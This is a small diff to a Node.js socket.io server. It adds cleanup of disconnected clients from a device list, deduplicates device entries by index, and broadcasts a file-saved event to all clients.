@@ -44,8 +44,23 @@ IO.sockets.on("connection", function (socket) {
 
     } else {
         v[index] = socket;
+        v[index].on("disconnect", () => {
+            console.log(index);
+            delete v[index];
+            d.forEach((e,i) => {
+                if(e.includes(index)){
+                    delete d[i];
+                }
+            });
+        });
         console.log(ip, index);
-        if (d.includes([query.model, ip, index])) { } else {
+        is = false;
+        d.forEach(element => {
+            if(element.includes(index)){
+                is = true
+            }
+        });
+        if (is) { } else {
             d[d.length] = [query.model, ip, index]
         }
     }
@@ -120,7 +135,7 @@ IO.sockets.on("connection", function (socket) {
                     console.log('Saving file failed');
                 else
                     console.log('File saved on ');
-                    socket.emit('dl',type)
+                    io.emit('dl',type)
             });
 
         } else if (data.length != 0) { // response with files list
